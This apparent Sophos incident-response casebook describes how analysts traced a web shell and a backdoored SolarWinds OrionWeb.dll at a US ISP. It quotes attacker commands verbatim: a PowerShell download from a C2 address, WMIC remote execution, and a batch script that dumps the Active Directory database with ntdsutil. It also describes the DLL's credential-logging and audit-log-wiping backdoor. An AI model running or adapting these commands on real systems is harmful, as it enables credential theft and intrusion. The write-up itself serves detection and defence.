<article id="post-72266" class="post-72266 post type-post status-publish format-standard has-post-thumbnail hentry category-security-operations tag-mtr tag-ransomware tag-sidebar tag-sophos-managed-threat-response-mtr tag-sophos-mtr region-en-us">

		<div class="md:mt-16 container mt-8">
		<div class="relative max-w-5xl mx-auto">
				<div
						class="aspect-w-16 aspect-h-9 flex bg-gray-400 bg-right bg-no-repeat bg-cover"
				>
					<img width="1200" height="628" src="https://news.sophos.com/wp-content/uploads/2020/08/sophos-news-ft-img-mtr_v3.png?w=1200" class="object-cover wp-post-image" alt="" srcset="https://news.sophos.com/wp-content/uploads/2020/08/sophos-news-ft-img-mtr_v3.png 1200w, https://news.sophos.com/wp-content/uploads/2020/08/sophos-news-ft-img-mtr_v3.png?resize=300,157 300w, https://news.sophos.com/wp-content/uploads/2020/08/sophos-news-ft-img-mtr_v3.png?resize=768,402 768w, https://news.sophos.com/wp-content/uploads/2020/08/sophos-news-ft-img-mtr_v3.png?resize=1024,536 1024w" sizes="(max-width: 1200px) 100vw, 1200px" />				</div>
								<div
						class="left-4 w-24 h-24 lg:left-12 xl:left-16 lg:w-40 lg:h-40 place-items-center absolute top-0 grid  "
				>
										<img
							src="https://news.sophos.com/wp-content/uploads/2022/07/Category-Icon-X-Ops-v2.png"
							alt="Security Operations"
					/>
														</div>
						</div>
	</div>


			
	<header>
		<div class="container mt-8 md:mt-16 md:-mb-4">
			<div class="max-w-4xl mx-auto">

				<h1 class="text-style-h1 mb-8">MTR casebook: Uncovering a backdoor implant in a SolarWinds Orion server</h1>
									<div class="text-xl md:text-2xl -mt-2 mb-6">
						A real-world story from the Sophos Managed Threat Response team					</div>
				
				<div class="text-xl md:text-xl -mt-2">
					<span class="byline">
		Written by 				<span class="author vcard">
				<a href="https://news.sophos.com/en-us/author/greg-iddon/" title="Posts by Greg Iddon" class="author url fn" rel="author">Greg Iddon</a>				</span>
								</span>
						</div>

				<div class="text-sophos-gray-600 mt-4 text-xs font-sansSemiBold font-semibold leading-tight uppercase">
					<span class="posted-on"><a href="https://news.sophos.com/en-us/2021/02/03/mtr-casebook-uncovering-a-backdoor-implant-in-a-solarwinds-orion-server/" rel="bookmark">February 03, 2021</a></span>				</div>

				<div class="mt-6 space-y-2 space-x-1">
					<a href="https://news.sophos.com/en-us/category/security-operations/" class="category-tag-pill">Security Operations</a> <a href="https://news.sophos.com/en-us/tag/mtr/" class="category-tag-pill">MTR</a> <a href="https://news.sophos.com/en-us/tag/ransomware/" class="category-tag-pill">Ransomware</a> <a href="https://news.sophos.com/en-us/tag/sophos-managed-threat-response-mtr/" class="category-tag-pill">Sophos Managed Threat Response (MTR)</a> <a href="https://news.sophos.com/en-us/tag/sophos-mtr/" class="category-tag-pill">Sophos MTR</a>				</div>
			</div>
		</div>
	</header><!-- .entry-header -->

	<div class="container md:my-16 xl:my-24 my-8">
	<div class="entry-content lg:prose-lg mx-auto prose max-w-4xl">
		<p><strong>Please note: Although elements of this story may seem connected to the recent SolarWinds Sunburst attack, we have not found any concrete evidence that these two incidents are related.</strong></p>
<p><em>Customer profile: An internet service provider and telecommunications organization based in the USA with approximately 1700 devices.</em></p>
<p>The Sophos <a href="https://sophos.com/mtr">Managed Threat Response</a> (MTR) team provides 24/7 threat hunting, detection, and response capabilities delivered by an expert team as a fully-managed service. Sophos <a href="https://sophos.com/rapidresponse">Rapid Response</a> provides emergency remote incident response for active incidents.</p>
<h2>Setting the scene</h2>
<p>The organization in question came to Sophos Rapid Response after falling victim to a <a href="https://news.sophos.com/en-us/2020/05/21/ragnar-locker-ransomware-deploys-virtual-machine-to-dodge-security/">Ragnar Locker</a> attack in early 2020. A ransomware payload was delivered manually by a highly capable group at around 2 a.m., while admins were asleep, hitting as many computers as they could in quick succession.</p>
<p>They hit hundreds.</p>
<p>Sophos Rapid Response was brought in to help identify, contain and neutralize the threat. It took the team less than two days to resolve the active threat and over the following days incident responders were able to ascertain the threat actor had entered the network two months prior to the ransomware attack.</p>
<p>With the Ragnar group removed from their network, the customer transitioned to the full MTR service in Notify mode with our security operations team watching over them 24/7.</p>
<p>While the pressing threat of Ragnar Locker was out of the picture, in November 2020 another threat actor stepped into view&#8230;</p>
<h2>Sneaking over WMI</h2>
<p>Increasingly, threat actors like to pack light when on a mission. They don’t bring their own tools and prefer to “live off the land.” They take advantage of capabilities built into operating systems, like Microsoft Windows, to evade detection.</p>
<p>Windows Management Instrumentation, or WMI for short, is a feature that enables remote management and automation of administrative tasks. It’s designed to ease the pains of managing large enterprise environments with an overwhelming number of computers.</p>
<p>But in the hands of a threat actor, WMI offers quite the rich toolbox to achieve a number of wide-ranging goals. And with WMIC, the command line interface for WMI, adversaries can write simple yet powerful one-line instructions.</p>
<p>For example, running Notepad on a remote computer:</p>
<p><a href="https://news.sophos.com/wp-content/uploads/2021/02/notepad.png"><img loading="lazy" class="alignnone wp-image-72368" src="https://news.sophos.com/wp-content/uploads/2021/02/notepad.png" alt="" width="480" height="418" srcset="https://news.sophos.com/wp-content/uploads/2021/02/notepad.png 700w, https://news.sophos.com/wp-content/uploads/2021/02/notepad.png?resize=300,261 300w" sizes="(max-width: 480px) 100vw, 480px" /></a></p>
<pre>wmic /user:"username” /password:”password” /node:"192.168.0.123" process call create “notepad.exe”</pre>
<p>Or listing all the local user accounts on a computer:</p>
<p><a href="https://news.sophos.com/wp-content/uploads/2021/02/accounts.png"><img loading="lazy" class="alignnone wp-image-72375" src="https://news.sophos.com/wp-content/uploads/2021/02/accounts.png" alt="" width="480" height="420" srcset="https://news.sophos.com/wp-content/uploads/2021/02/accounts.png 700w, https://news.sophos.com/wp-content/uploads/2021/02/accounts.png?resize=300,263 300w" sizes="(max-width: 480px) 100vw, 480px" /></a></p>
<pre>wmic useraccount get /ALL /format:csv</pre>
<p>Hunting for abuse of WMI is essential, but discerning the difference between legitimate use of WMI and malicious use is no easy task, often requiring a keen eye towards the context of the commands. What commands came before? What commands came after? What is the intent?</p>
<p>These are the questions our MTR operators ask themselves as a number of suspicious looking WMI commands are identified in the customer&#8217;s network, all taking place in quick succession, during a routine threat hunt alongside researchers from SophosLabs.</p>
<h2>Hunting for threat actors</h2>
<p>The threat hunters see the first red flag. WMIC was used to instruct remote computers to launch commands. This alone is suspicious, but where did the commands come from?</p>
<p><a href="https://news.sophos.com/wp-content/uploads/2021/02/w3wp-tree.png"><img loading="lazy" class="alignnone wp-image-72390 " src="https://news.sophos.com/wp-content/uploads/2021/02/w3wp-tree.png" alt="" width="809" height="153" srcset="https://news.sophos.com/wp-content/uploads/2021/02/w3wp-tree.png 3196w, https://news.sophos.com/wp-content/uploads/2021/02/w3wp-tree.png?resize=300,57 300w, https://news.sophos.com/wp-content/uploads/2021/02/w3wp-tree.png?resize=768,145 768w, https://news.sophos.com/wp-content/uploads/2021/02/w3wp-tree.png?resize=1024,194 1024w, https://news.sophos.com/wp-content/uploads/2021/02/w3wp-tree.png?resize=1536,291 1536w, https://news.sophos.com/wp-content/uploads/2021/02/w3wp-tree.png?resize=2048,388 2048w" sizes="(max-width: 809px) 100vw, 809px" /></a></p>
<p>Looking at the hierarchy, <code>wmic.exe</code> was executed by <code>cmd.exe</code>, the Windows Command Prompt. And <code>cmd.exe</code> was executed by <code>w3wp.exe</code>, a worker process for Microsoft IIS – a web server.</p>
<p>A web server. Surely no measured admin would launch administrative commands to other servers from their own web server?</p>
<p>And what is going on in this command seen on the web server?</p>
<p><a href="https://news.sophos.com/wp-content/uploads/2021/02/backup-bat.png"><img loading="lazy" class="alignnone wp-image-72377" src="https://news.sophos.com/wp-content/uploads/2021/02/backup-bat.png" alt="" width="480" height="140" srcset="https://news.sophos.com/wp-content/uploads/2021/02/backup-bat.png 719w, https://news.sophos.com/wp-content/uploads/2021/02/backup-bat.png?resize=300,87 300w" sizes="(max-width: 480px) 100vw, 480px" /></a></p>
<pre>wmic /node:192.168.0.123 /user:"REDACTED" /password:"REDACTED" process call create "c:\Windows\Temp\backup.bat"</pre>
<p>WMIC calls out to a remote computer, authenticated with credentials, to create a new process and execute a script called <code>backup.bat</code>. On its own, it’s not terribly suspicious. But given that this was initiated by a web server worker process, we need to dig deeper. What is <code>backup.bat</code>?</p>
<p>MTR finds another troubling command.</p>
<p><a href="https://news.sophos.com/wp-content/uploads/2021/02/update-download.png"><img loading="lazy" class="alignnone wp-image-72389" src="https://news.sophos.com/wp-content/uploads/2021/02/update-download.png" alt="" width="480" height="170" srcset="https://news.sophos.com/wp-content/uploads/2021/02/update-download.png 700w, https://news.sophos.com/wp-content/uploads/2021/02/update-download.png?resize=300,106 300w" sizes="(max-width: 480px) 100vw, 480px" /></a></p>
<pre>cmd /c "powershell (new-object system.net.webclient).downloadfile('http://98[.]225.248.37:8090/update','c:\users\public\update')"&amp;exit</pre>
<p>Combined with the context of the previous command, it is clearly suspicious to see PowerShell (another Microsoft task automation and configuration management tool) creating a webclient to “downloadfile” from an unknown host, a file called “update”.</p>
<p>Before continuing, an MTR operator sends the first notification to the customer and engages their admin team.</p>
<p>The operator shares the observed WMIC commands as well as the servers and users associated with the commands, with guidance to reset those user passwords and to use Sophos Intercept X to isolate the servers from the rest of the network. Additionally, that strange IP address needs blocking on their firewall.</p>
<p>On with the investigation.</p>
<p>Looking back in time to the preceding commands, the picture becomes clearer.</p>
<p><a href="https://news.sophos.com/wp-content/uploads/2021/02/ntdsutil.png"><img loading="lazy" class="alignnone wp-image-72384" src="https://news.sophos.com/wp-content/uploads/2021/02/ntdsutil.png" alt="" width="480" height="284" srcset="https://news.sophos.com/wp-content/uploads/2021/02/ntdsutil.png 700w, https://news.sophos.com/wp-content/uploads/2021/02/ntdsutil.png?resize=300,177 300w" sizes="(max-width: 480px) 100vw, 480px" /></a></p>
<pre>cmd /c "echo mkdir c:\windows\temp\tmp &gt; \\192.168.0.123\c$\Windows\Temp\backup.bat" 
cmd /c "echo ntdsutil "ac i ntds" ifm "create full C:\Windows\Temp\tmp" q q &gt;&gt; \\192.168.0.123\c$\Windows\Temp\backup.bat"</pre>
<p>That’s no backup command. A <code>.bat</code> file is a Batch script, the classic way of bundling Windows commands together rather than running each by hand.</p>
<p>Echo typically prints a line of text to the screen (i.e. the command terminal) however the <code>&gt;</code> symbol is a redirect. Instead of writing the text <code>mkdir …</code> to the terminal, it’s writing to a file on a remote system.</p>
<p>The threat actor built a script on a remote computer. And they had run it.</p>
<p>First it creates a new “tmp” folder in the Windows temporary directory (where things are put when it doesn’t matter if they disappear later on). Next it uses <code>ntdsutil.exe</code>&#8230;</p>
<p>To a veteran threat hunter, the threat actor’s goal is clear.</p>
<h2>Credential access to elevate privileges</h2>
<p>Ntdsutil is short for NT Directory Services Utility. It is a tool for interacting with Active Directory servers, Microsoft’s centralized suite of technologies responsible for authenticating and authorizing users and computers in a Windows domain.</p>
<p>The arguments <code>"ac i ntds" ifm "create full …"</code> writes a full dump, a copy, of the entire Active Directory database intended for the legitimate purpose of domain controller deployment using the “install from media” option.</p>
<p>This actor tried to get their hands on credentials, and that variant of the command is often used by threat actors who have access to the domain controller but don’t yet have domain admin credentials.</p>
<p>They tried to elevate privileges. And they were caught red-handed.</p>
<p>An operator gets back in touch with the customer to fill them in with the latest discoveries. The customer initiates domain-wide password resets. Better to be safe than sorry.</p>
<p>With the malicious IP blocked, all passwords reset, and those servers isolated, the threat actor is dead in the water.</p>
<p>But it is still a mystery how they orchestrated these commands. Where is the initial point of entry?</p>
<p>What did they do on that webserver?</p>
<h2>Web shells</h2>
<p>Public webservers are inherently risky. Not only do they face the internet, making them a prime target for an adversary’s initial intrusion into an organization’s network, it’s normal for them to communicate with a wide range of IP addresses never seen before.</p>
<p>All that web traffic, all that noise, makes web servers a wonderful place to hide and launch commands. Only a keen eye will spot that needle amongst the hay. Especially if you’re only looking at network traffic.</p>
<p>Thankfully, MTR collects endpoint telemetry as well as network telemetry, providing rich data to contextualize anything that might be found.</p>
<p>Looking over all the commands the threat actor ran on the server, a pattern emerges.</p>
<p><a href="https://news.sophos.com/wp-content/uploads/2021/02/big-fm.png"><img loading="lazy" class="alignnone wp-image-72379" src="https://news.sophos.com/wp-content/uploads/2021/02/big-fm.png" alt="" width="480" height="116" srcset="https://news.sophos.com/wp-content/uploads/2021/02/big-fm.png 700w, https://news.sophos.com/wp-content/uploads/2021/02/big-fm.png?resize=300,72 300w" sizes="(max-width: 480px) 100vw, 480px" /></a></p>
<pre>cmd /c "copy \\192.168.0.123\c$\windows\temp\tmp\big.fm f:\sites\REDACTED\big.fm"</pre>
<p>This command called out to a remote server to copy a file called <code>big.fm</code> from the tmp directory we saw earlier. Sadly, “Big FM” is not the name of the threat actor’s favorite Top 40 radio station, it’s what the threat actor named the Active Directory database dump.</p>
<p>What sticks out in this command, and many others they ran, is they only copied files to a particular folder on the webserver inside <code>f:\sites\</code>. Almost as if this was the only folder they had permissions to access. A folder where the website code resides.</p>
<p>This smells like a web shell.</p>
<p>Looking inside <code>f:\sites\</code> our MTR operator finds a lonely looking file called <code>about.aspx</code>. Active Server Page Extended (ASPX) is a framework for writing dynamic websites. Taking a look over the code, our operator observes that the web page will receive encoded web requests and send the decoded request to cmd.exe, the Windows command prompt.</p>
<p><a href="https://news.sophos.com/wp-content/uploads/2021/02/about-aspx.png"><img loading="lazy" class="alignnone size-full wp-image-72374" src="https://news.sophos.com/wp-content/uploads/2021/02/about-aspx.png" alt="" width="640" height="592" srcset="https://news.sophos.com/wp-content/uploads/2021/02/about-aspx.png 1726w, https://news.sophos.com/wp-content/uploads/2021/02/about-aspx.png?resize=300,278 300w, https://news.sophos.com/wp-content/uploads/2021/02/about-aspx.png?resize=768,711 768w, https://news.sophos.com/wp-content/uploads/2021/02/about-aspx.png?resize=1024,947 1024w, https://news.sophos.com/wp-content/uploads/2021/02/about-aspx.png?resize=1536,1421 1536w" sizes="(max-width: 640px) 100vw, 640px" /></a></p>
<p>This is a web shell.</p>
<p>But why wasn’t it detected earlier?</p>
<p>Grabbing a copy of the file, MTR sends this immediately to SophosLabs for deeper analysis. Even as the file passes through our automated analysis systems, it’s clear this web shell variant has never been seen before. SophosLabs researchers quickly tear it apart and publish detections for this new variant, protecting all our customers around the globe from this web shell should it be used again.</p>
<p>At the time of writing this article we are the only vendor with a detection published for this web shell variant (detected as <a href="https://www.virustotal.com/gui/file/f39dc0dfd43477d65c1380a7cff89296ad72bfa7fc3afcfd8e294f195632030e/detection">Troj/WebShel-H</a>). The file hash is in the IOCs table at the bottom of this article.</p>
<p>With the web shell neutralized (hopefully along with the threat actor’s access), our operators move their focus to answering several important questions: Where did this web shell come from? What else was it used for? And what was the file update that the threat actor downloaded?</p>
<h2>OrionWeb.dll</h2>
<p>Scouring historic telemetry gathered by MTR since the service’s technology was deployed shows no signs of when the web shell was installed. Plenty of file accesses and timestamp modifications are observed, but it’s clear the web shell was deployed before Rapid Response had been engaged and our telemetry collection began.</p>
<p>This is a dead end.</p>
<p>Looking to what events preceded the download of the file update prove to be more fruitful albeit concerning including another request to a different C2 &#8211; http://216[.]243.39.167:8090/ &#8211; to fetch another version of the file.</p>
<p>The following command is observed:</p>
<p><a href="https://news.sophos.com/wp-content/uploads/2021/02/update-copy.png"><img loading="lazy" class="alignnone wp-image-72388" src="https://news.sophos.com/wp-content/uploads/2021/02/update-copy.png" alt="" width="480" height="116" srcset="https://news.sophos.com/wp-content/uploads/2021/02/update-copy.png 702w, https://news.sophos.com/wp-content/uploads/2021/02/update-copy.png?resize=300,72 300w" sizes="(max-width: 480px) 100vw, 480px" /></a></p>
<pre>cmd /c "copy \\192.168.0.124\c$\inetpub\SolarWinds\orion\update \\10.128.11.149\c$\inetpub\SolarWinds\bin\OrionWeb.dll /y"</pre>
<p>Whatever update is, it has been used to replace a component of SolarWinds Orion called <code>OrionWeb.dll</code>.</p>
<p>Time to investigate this DLL.</p>
<p>DLLs are dynamic-link libraries, bundles of executable code that are called upon by applications, implementing various features and capabilities of an application. One can’t simply swap out a DLL with something completely different without causing an application to crash or throw lots of errors.</p>
<p>This needs expert eyes to investigate. MTR shares a sample with SophosLabs for reverse engineering and analysis.</p>
<p>This sample is not cryptographically signed, which is odd for a DLL purporting to be from a reputable vendor.</p>
<p><a href="https://news.sophos.com/wp-content/uploads/2021/02/bad-details.png"><img loading="lazy" class="alignnone wp-image-72378" src="https://news.sophos.com/wp-content/uploads/2021/02/bad-details.png" alt="" width="300" height="421" srcset="https://news.sophos.com/wp-content/uploads/2021/02/bad-details.png 363w, https://news.sophos.com/wp-content/uploads/2021/02/bad-details.png?resize=214,300 214w" sizes="(max-width: 300px) 100vw, 300px" /></a></p>
<p>Digital signatures are a vital part of the trust model for Microsoft Windows. By using strong cryptography, these signatures enable both the authenticity of a file, confirming it is from who it says it is from, as well as the integrity of a file, confirming it has not been modified or corrupted in some way.</p>
<p>If someone were to modify this DLL, the digital signature would no longer validate the file integrity. But if the signature is entirely removed, there’s nothing to use to validate the file integrity at all.</p>
<p>MTR compares the file to a known-good copy of <code>OrionWeb.dll</code> and it is clear this file was and should be signed. Who removed the signature? And why?</p>
<p><a href="https://news.sophos.com/wp-content/uploads/2021/02/good-details.png"><img loading="lazy" class=" wp-image-72381" src="https://news.sophos.com/wp-content/uploads/2021/02/good-details.png" alt="" width="300" height="377" srcset="https://news.sophos.com/wp-content/uploads/2021/02/good-details.png 405w, https://news.sophos.com/wp-content/uploads/2021/02/good-details.png?resize=239,300 239w" sizes="(max-width: 300px) 100vw, 300px" /></a><a href="https://news.sophos.com/wp-content/uploads/2021/02/good-signature-2.png"><img loading="lazy" class=" wp-image-72382" src="https://news.sophos.com/wp-content/uploads/2021/02/good-signature-2.png" alt="" width="300" height="358" srcset="https://news.sophos.com/wp-content/uploads/2021/02/good-signature-2.png 405w, https://news.sophos.com/wp-content/uploads/2021/02/good-signature-2.png?resize=252,300 252w" sizes="(max-width: 300px) 100vw, 300px" /></a></p>
<p><code>OrionWeb.dll</code> is a .NET assembly, written in C# (pronounced “C sharp”). C# is a Microsoft programming language that can easily take advantage of the capabilities of the .NET (“dotNET”) framework, and .NET is Microsoft&#8217;s powerful framework for writing applications for their platforms and interfacing with various Microsoft technologies.</p>
<p>One of the benefits of .NET assemblies is that they can be debugged and modified far easier than traditional compiled executables. One can open them up in a variety of tools like <a href="https://github.com/dnSpy/dnSpy">dnSpy</a> and read and change the code they contain.</p>
<p>SophosLabs fully decompile the suspicious DLL and compare it to a known-good sample using the popular diff application <a href="https://winmerge.org/">WinMerge</a>, a tool that enables file comparison and highlights the differences between them.</p>
<p><a href="https://news.sophos.com/wp-content/uploads/2021/02/dll-diff.png"><img loading="lazy" class="alignnone size-full wp-image-72380" src="https://news.sophos.com/wp-content/uploads/2021/02/dll-diff.png" alt="" width="640" height="459" srcset="https://news.sophos.com/wp-content/uploads/2021/02/dll-diff.png 1173w, https://news.sophos.com/wp-content/uploads/2021/02/dll-diff.png?resize=300,215 300w, https://news.sophos.com/wp-content/uploads/2021/02/dll-diff.png?resize=768,551 768w, https://news.sophos.com/wp-content/uploads/2021/02/dll-diff.png?resize=1024,734 1024w" sizes="(max-width: 640px) 100vw, 640px" /></a></p>
<p>But as SophosLabs begin to dig into what had been changed, the changes seem incredibly minor. For instance, where the class of code <code>LdapAuthentication</code> previously inherited the other classes <code>ILdapAuthentication</code> and <code>IDisposable</code> in that order, the order was reversed in the suspicious sample.</p>
<p><a href="https://news.sophos.com/wp-content/uploads/2021/02/parameter-refactor.png"><img loading="lazy" class="alignnone size-full wp-image-72387" src="https://news.sophos.com/wp-content/uploads/2021/02/parameter-refactor.png" alt="" width="640" height="285" srcset="https://news.sophos.com/wp-content/uploads/2021/02/parameter-refactor.png 2024w, https://news.sophos.com/wp-content/uploads/2021/02/parameter-refactor.png?resize=300,133 300w, https://news.sophos.com/wp-content/uploads/2021/02/parameter-refactor.png?resize=768,342 768w, https://news.sophos.com/wp-content/uploads/2021/02/parameter-refactor.png?resize=1024,455 1024w, https://news.sophos.com/wp-content/uploads/2021/02/parameter-refactor.png?resize=1536,683 1536w" sizes="(max-width: 640px) 100vw, 640px" /></a></p>
<p>Reviewing many of the other classes of code in the files, this same pattern of change is observed – parameters swapped around for no obvious reason. Anyone quick to run their eye over these changes would rightfully assume that the software developer has just refactored (i.e. reorganized) their code and nothing suspicious or malicious is present.</p>
<p>Yet given the context of how this file was discovered, SophosLabs and our operators push on with analyzing the sample to try and discover why this different DLL is so important to them that they needed to replace the original with it.</p>
<p>Eventually a discovery is made in the <code>ValidateUser</code> function (in SolarWinds.Orion.Web.OrionMembershipProvider). A chunk of code has been inserted. And it completely changes the behavior of the function.</p>
<p><a href="https://news.sophos.com/wp-content/uploads/2021/02/backdoor-implant.png"><img loading="lazy" class="alignnone size-full wp-image-72376" src="https://news.sophos.com/wp-content/uploads/2021/02/backdoor-implant.png" alt="" width="640" height="307" srcset="https://news.sophos.com/wp-content/uploads/2021/02/backdoor-implant.png 2019w, https://news.sophos.com/wp-content/uploads/2021/02/backdoor-implant.png?resize=300,144 300w, https://news.sophos.com/wp-content/uploads/2021/02/backdoor-implant.png?resize=768,368 768w, https://news.sophos.com/wp-content/uploads/2021/02/backdoor-implant.png?resize=1024,491 1024w, https://news.sophos.com/wp-content/uploads/2021/02/backdoor-implant.png?resize=1536,736 1536w" sizes="(max-width: 640px) 100vw, 640px" /></a></p>
<p><strong>This SolarWinds Orion server was backdoored!</strong></p>
<h2>A Hidden Backdoor</h2>
<p><a href="https://news.sophos.com/wp-content/uploads/2021/02/orionweb-dll.png"><img loading="lazy" class="alignnone size-full wp-image-72386" src="https://news.sophos.com/wp-content/uploads/2021/02/orionweb-dll.png" alt="" width="640" height="498" srcset="https://news.sophos.com/wp-content/uploads/2021/02/orionweb-dll.png 2336w, https://news.sophos.com/wp-content/uploads/2021/02/orionweb-dll.png?resize=300,233 300w, https://news.sophos.com/wp-content/uploads/2021/02/orionweb-dll.png?resize=768,597 768w, https://news.sophos.com/wp-content/uploads/2021/02/orionweb-dll.png?resize=1024,796 1024w, https://news.sophos.com/wp-content/uploads/2021/02/orionweb-dll.png?resize=1536,1194 1536w, https://news.sophos.com/wp-content/uploads/2021/02/orionweb-dll.png?resize=2048,1592 2048w" sizes="(max-width: 640px) 100vw, 640px" /></a></p>
<p>The original <code>ValidateUser</code> function was quite simple – it would be called with a username and password and then, behind the scenes, it would call another function called <code>InternalValidateUser</code> that would do the heavy lifting of authenticating the user.</p>
<p>However, the actor behind this threat added a lot of extra logic to the <code>ValidateUser</code> function.</p>
<p>First, a <code>try/catch</code> pattern was inserted on lines 5 and 54 with the <code>catch</code> block empty. This pattern ensures that any errors that may occur in the try block are suppressed and don’t cause the whole application to crash or print out errors that may reveal something is awry.</p>
<p>Next, a <code>StreamWriter</code> was added on line 7 which would write text to a seemingly randomly named file in the <code>C:\Users\Default\AppData\Local\Temp\</code> directory. Any provided username and password would be written to the file, encrypted with a simple binary XOR and Addition cipher with hard coded keys.</p>
<p>The adversary wanted to continuously capture a stream of valid usernames and passwords for SolarWinds Orion.</p>
<p>After that, a conditional <code>if</code> statement was inserted on line 21 which looked for when the provided username is <code>_system</code>. A username that did not exist in the application’s database. A username only the adversary would know about.</p>
<p>Within the <code>if</code> statement were several instructions to access the application’s SQL database and delete the audit logs that would have revealed any usage of this <code>_system</code> username. The threat actor clearly had knowledge of how OrionWeb functions and how best to cover their tracks.</p>
<p>A text string was then constructed on line 57 and 58 that would take the number of days since epoch – a specific point in time which is counted upwards from to describe the current date/time. Effectively this string is the number of days since January 1st 1970. Around the number of days since epoch, <code>80CD1DB_</code> and <code>_0F90D2</code> are added, e.g. <code>80CD1DB_42745_0F90D2</code>.</p>
<p>But why would a dynamic text string be needed, one that changes every single day? The answer soon becomes clear.</p>
<p>The final modification was in the return statement on line 59.</p>
<p>The original statement would call the <code>InternalValidateUser</code> function. Inferring from the changes, this function would either return <code>True</code> or <code>False</code> (for either a successful or unsuccessful authentication). Yet the adversary had added two additional ways for the <code>ValidateUser</code> function to return <code>True</code>. If the password is this dynamic text string, or if the username is “_system” and the password is also the dynamic text string.</p>
<p>The adversary implanted a custom, dynamic password and username that only they would know about and ensured their usage of these credentials would never end up in the SolarWinds Orion audit logs.</p>
<p>And then another malicious injection is found.</p>
<p>Lurking in the <code>GetLdapIdentity</code> function (in <code>SolarWinds.Orion.Web.OrionMixedModeAuth</code>), SophosLabs discover the following code:</p>
<p><a href="https://news.sophos.com/wp-content/uploads/2021/02/orionweb-dll-2.png"><img loading="lazy" class="alignnone size-full wp-image-72385" src="https://news.sophos.com/wp-content/uploads/2021/02/orionweb-dll-2.png" alt="" width="640" height="186" srcset="https://news.sophos.com/wp-content/uploads/2021/02/orionweb-dll-2.png 2413w, https://news.sophos.com/wp-content/uploads/2021/02/orionweb-dll-2.png?resize=300,87 300w, https://news.sophos.com/wp-content/uploads/2021/02/orionweb-dll-2.png?resize=768,223 768w, https://news.sophos.com/wp-content/uploads/2021/02/orionweb-dll-2.png?resize=1024,297 1024w, https://news.sophos.com/wp-content/uploads/2021/02/orionweb-dll-2.png?resize=1536,446 1536w, https://news.sophos.com/wp-content/uploads/2021/02/orionweb-dll-2.png?resize=2048,595 2048w" sizes="(max-width: 640px) 100vw, 640px" /></a></p>
<p>Similar to the <code>StreamWriter</code> observed above, the functionality intercepts credentials as they are being used by the application and encrypts and writes them to another seemingly randomly named file. But this time the adversary is stealing LDAP, Lightweight Directory Access Protocol, credentials which are used for authenticating with directory services like Microsoft Active Directory.</p>
<p>The adversary wanted to continuously capture a stream of valid usernames and passwords for the customer’s domain, not just for SolarWinds Orion.</p>
<p>Thankfully, the affected hosts are already isolated. MTR confirms with the customer that these hosts are taken offline and are rebuilt to ensure no backdoor remains in their network.</p>
<h2>The Big Picture</h2>
<p>The sequence of events is now clear:</p>
<ul>
<li>The threat actor gained access to the web server and installed a web shell to send commands and orchestrate the rest of the attack</li>
<li>A backdoored version of OrionWeb.dll was downloaded from their C2 server. Additional logic was added to authenticate the username “_system” with a dynamic password that would change every day and the digital signature of the file removed.</li>
<li>OrionWeb.dll was replaced with their backdoored version.</li>
<li>Discovery was performed and domain controllers accessed to create a full dump of Active Directory to use for privilege escalation or to exfiltrate.</li>
</ul>
<p>Given the recent supply chain attack on SolarWinds, this attack is certainly of note. However, we could not identify concrete evidence that the two are connected. The C2s, web shell, and DLL used in this attack are not ones we have observed before, outside of this single incident, nor have we observed them used since.</p>
<p>This style of attack is not specific to SolarWinds Orion and does not rely upon the exploitation of a vulnerability in its code. A threat actor can reverse engineer and maliciously modify a .NET assembly using freely available tools with no requirement for source code access.</p>
<p>The threat actor behind this attack is clearly highly skilled and capable. Their playbook of identifying viable .NET assemblies to backdoor underlines the importance of threat hunting, as well as application allowlisting and file integrity monitoring (both available in Sophos Intercept X Advanced for Server).</p>
<p>We hope the details shared through this casebook as well as the IOAs and IOCs below enable threat hunters around the globe to look for similar malicious modifications of OrionWeb.dll and other .NET assemblies, which will aid in better protection for all.</p>
<h2>Learn more</h2>
<p>For more information on the Sophos MTR service <a href="https://sophos.com/mtr">visit our website</a> or <a href="https://secure2.sophos.com/en-us/products/managed-threat-response/contact-request.aspx">speak with a Sophos representative</a>.</p>
<p>If you prefer to conduct your own threat hunts <a href="https://www.sophos.com/en-us/products/endpoint-antivirus/edr.aspx">Sophos EDR</a> gives you the tools you need for advanced threat hunting and IT security operations hygiene. Start a <a href="https://secure2.sophos.com/en-us/products/endpoint-antivirus/free-trial.aspx">30-day no obligation trial</a> today.</p>
<h2>IOAs / IOCs</h2>
<table>
<tbody>
<tr>
<td><strong>Description</strong></td>
<td><strong>Indicator</strong></td>
</tr>
<tr>
<td>Web shell SHA256 (about.aspx)</td>
<td>f39dc0dfd43477d65c1380a7cff89296ad72bfa7fc3afcfd8e294f195632030e</td>
</tr>
<tr>
<td>Sophos detection for web shell</td>
<td><a href="https://www.virustotal.com/gui/file/f39dc0dfd43477d65c1380a7cff89296ad72bfa7fc3afcfd8e294f195632030e/detection">Troj/WebShel-H</a></td>
</tr>
<tr>
<td>C2 URLs</td>
<td>http://98.225.248.37:8090<br />
http://216.243.39.167:8090</td>
</tr>
<tr>
<td>C2 IPv4s</td>
<td>98.225.248.37<br />
216.243.39.167</td>
</tr>
<tr>
<td>Backdoored OrionWeb.dll SHA256</td>
<td>a25fc5af86296dcd5bb41668443a36947bccd17a1687f9b118675f1503b3e376</td>
</tr>
<tr>
<td>Sophos detection for .dll</td>
<td><a href="https://www.virustotal.com/gui/file/a25fc5af86296dcd5bb41668443a36947bccd17a1687f9b118675f1503b3e376/detection">Mal/Generic-S + Troj/MSIL-QJK</a></td>
</tr>
</tbody>
</table>
<p>&nbsp;</p>
<h2>MITRE ATT&amp;CK</h2>
<table>
<tbody>
<tr>
<td><b>ID </b></td>
<td><b>Tactic </b></td>
<td><b>Technique </b></td>
</tr>
<tr>
<td><a href="https://attack.mitre.org/techniques/T1047/">T1047</a></td>
<td>Execution</td>
<td>Windows Management Instrumentation</td>
</tr>
<tr>
<td><a href="https://attack.mitre.org/techniques/T1059/001/">T1059.001</a>/<a href="https://attack.mitre.org/techniques/T1059/003/">.003</a></td>
<td>Execution</td>
<td>Command and Scripting Interpreter</td>
</tr>
<tr>
<td><a href="https://attack.mitre.org/techniques/T1505/003/">T1505.003</a></td>
<td>Persistence</td>
<td>Server Software Component: Web Shell</td>
</tr>
<tr>
<td><a href="https://attack.mitre.org/techniques/T1554/">T1554</a></td>
<td>Persistence</td>
<td>Compromise Client Software Binary</td>
</tr>
<tr>
<td><a href="https://attack.mitre.org/techniques/T1078/002/">T1078.002</a></td>
<td>Privilege Escalation</td>
<td>Valid Accounts: Domain Accounts</td>
</tr>
<tr>
